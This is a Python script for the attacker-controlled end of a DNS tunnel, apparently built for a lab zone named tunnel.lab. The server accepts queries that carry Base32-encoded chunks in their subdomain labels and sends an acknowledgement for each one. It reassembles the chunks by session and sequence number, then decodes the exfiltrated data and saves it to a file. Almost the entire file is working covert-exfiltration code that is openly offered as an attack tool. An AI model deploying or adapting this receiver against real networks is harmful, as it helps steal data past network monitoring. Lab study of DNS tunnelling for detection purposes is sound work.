#!/usr/bin/env python3
"""
DNS Tunnel – Attacker-controlled Authoritative Server
======================================================
Authoritative for the zone  tunnel.lab

Query protocol
--------------
  DATA  :  <b32_chunk>.<seq>.<session>.tunnel.lab   → A  1.0.0.1  (ACK)

The server reconstructs the exfiltrated payload by reassembling
ordered Base32 chunks.
"""

import base64
import json
import logging
import os
import threading
import time
from collections import defaultdict

from dnslib import A, QTYPE, RCODE, RR
from dnslib.server import BaseResolver, DNSServer

# ── Logging ───────────────────────────────────────────────────
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [SERVER] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger(__name__)

TUNNEL_DOMAIN = "tunnel.lab"
LOG_PATH = "/logs/server_events.jsonl"


class TunnelResolver(BaseResolver):
    """
    DNS resolver that doubles as a covert data sink.

    Incoming query structure:
        <base32_chunk> . <seq_number> . <session_id> . tunnel . lab
        └───────────────────────────────────────────────────────────
                              DATA query
    """

    def __init__(self):
        self._lock = threading.Lock()
        # session_id  →  { seq_int: b32_chunk_str }
        self._sessions: dict[str, dict[int, str]] = defaultdict(dict)
        self._session_totals: dict[str, int] = {}
        self._completed_sessions: set[str] = set()
        self._stats = {
            "queries_total": 0,
            "queries_tunnel": 0,
            "bytes_received": 0,
            "start_time": time.time(),
        }
        os.makedirs(os.path.dirname(LOG_PATH), exist_ok=True)
        self._logfile = open(LOG_PATH, "a")

    # ── Core DNS handler ──────────────────────────────────────

    def resolve(self, request, handler):
        qname = str(request.q.qname).rstrip(".")
        labels = qname.split(".")
        reply = request.reply()

        with self._lock:
            self._stats["queries_total"] += 1

        # Only handle our zone
        base = TUNNEL_DOMAIN.split(".")
        if labels[-len(base):] != base:
            reply.header.rcode = RCODE.NXDOMAIN
            return reply

        sub = labels[: -len(base)]  # labels before tunnel.lab

        if not sub:
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("10.10.0.10"), ttl=0))
            return reply

        # ── Data chunk:  <chunk>.<seq>.<total>.<session>.tunnel.lab ──
        # Backwards-compatible with: <chunk>.<seq>.<session>.tunnel.lab
        try:
            if len(sub) >= 4:
                chunk, seq_str, total_str, session_id = sub[0], sub[1], sub[2], sub[3]
                total = int(total_str)
            elif len(sub) == 3:
                chunk, seq_str, session_id = sub[0], sub[1], sub[2]
                total = None
            elif len(sub) == 2:
                chunk, seq_str, session_id = sub[0], sub[1], "default"
                total = None
            else:
                raise ValueError("too few labels")

            seq = int(seq_str)

            with self._lock:
                # If a new transmission starts (seq 0) and this session was completed or already had seq 0, reset buffer
                if seq == 0 and (session_id in self._completed_sessions or 0 in self._sessions[session_id]):
                    self._sessions[session_id].clear()
                    self._completed_sessions.discard(session_id)

                self._sessions[session_id][seq] = chunk
                if total is not None:
                    self._session_totals[session_id] = total
                self._stats["queries_tunnel"] += 1

            event_data = {"type": "data", "session": session_id, "seq": seq, "chunk": chunk}
            if total is not None:
                event_data["total"] = total
            self._log_event(event_data)

            if total is not None:
                log.info(f"← [{session_id}] seq={seq:03d}/{total-1:03d}  chunk={chunk[:25]}…")
            else:
                log.info(f"← [{session_id}] seq={seq:03d}  chunk={chunk[:25]}…")

            # Check if all chunks have arrived
            if total is not None:
                self._check_and_save(session_id, total)

            # ACK: 1.0.0.1
            reply.add_answer(RR(qname, QTYPE.A, rdata=A("1.0.0.1"), ttl=0))

        except (ValueError, IndexError) as exc:
            log.warning(f"Malformed query: {qname}  ({exc})")
            reply.header.rcode = RCODE.SERVFAIL

        return reply

    # ── Helpers ───────────────────────────────────────────────

    def _check_and_save(self, session_id: str, total: int):
        with self._lock:
            buf = dict(self._sessions.get(session_id, {}))
            if session_id in self._completed_sessions:
                return
            if len(buf) < total or not all(i in buf for i in range(total)):
                return
            self._completed_sessions.add(session_id)

        joined = "".join(buf[i] for i in range(total)).upper()
        pad = (8 - len(joined) % 8) % 8
        try:
            decoded_bytes = base64.b32decode(joined + "=" * pad)
            decoded_text = decoded_bytes.decode("utf-8", errors="replace")
            output_file = "/logs/received.txt"
            with open(output_file, "w", encoding="utf-8") as f:
                f.write(decoded_text)

            self._log_event({
                "type": "file_received",
                "session": session_id,
                "output_file": output_file,
                "bytes": len(decoded_bytes),
                "chunks": total,
            })
            log.info(f"✓ [{session_id}] All {total} chunks received! Decoded {len(decoded_bytes)} B -> saved to {output_file}")
        except Exception as exc:
            log.error(f"Decode/save error for session {session_id}: {exc}")

    def get_decoded(self, session_id: str = "default") -> bytes | None:
        """Reassemble all buffered chunks and decode Base32."""
        with self._lock:
            buf = dict(self._sessions.get(session_id, {}))
        if not buf:
            return None
        joined = "".join(buf[k] for k in sorted(buf)).upper()
        pad = (8 - len(joined) % 8) % 8
        try:
            return base64.b32decode(joined + "=" * pad)
        except Exception as exc:
            log.error(f"Decode error: {exc}")
            return None

    def print_stats(self):
        with self._lock:
            s = dict(self._stats)
        uptime = time.time() - s["start_time"]
        log.info(
            f"[stats] uptime={uptime:.0f}s | "
            f"total={s['queries_total']} | "
            f"tunnel={s['queries_tunnel']}"
        )

    def _log_event(self, event: dict):
        event["ts"] = time.time()
        self._logfile.write(json.dumps(event) + "\n")
        self._logfile.flush()


# ── Entry point ───────────────────────────────────────────────

if __name__ == "__main__":
    resolver = TunnelResolver()
    server = DNSServer(resolver, port=53, address="0.0.0.0", tcp=False)
    server.start_thread()
    log.info(f"Authoritative DNS server started – zone: {TUNNEL_DOMAIN}")

    try:
        while True:
            time.sleep(10)
            resolver.print_stats()
            # Print any decoded data received for active sessions
            with resolver._lock:
                sessions = list(resolver._sessions.keys())
            for sid in sessions:
                data = resolver.get_decoded(sid)
                if data:
                    log.info(f"[DECODED PAYLOAD {sid}] {data.decode('utf-8', errors='replace')!r}")
    except KeyboardInterrupt:
        server.stop()
        log.info("Server stopped.")
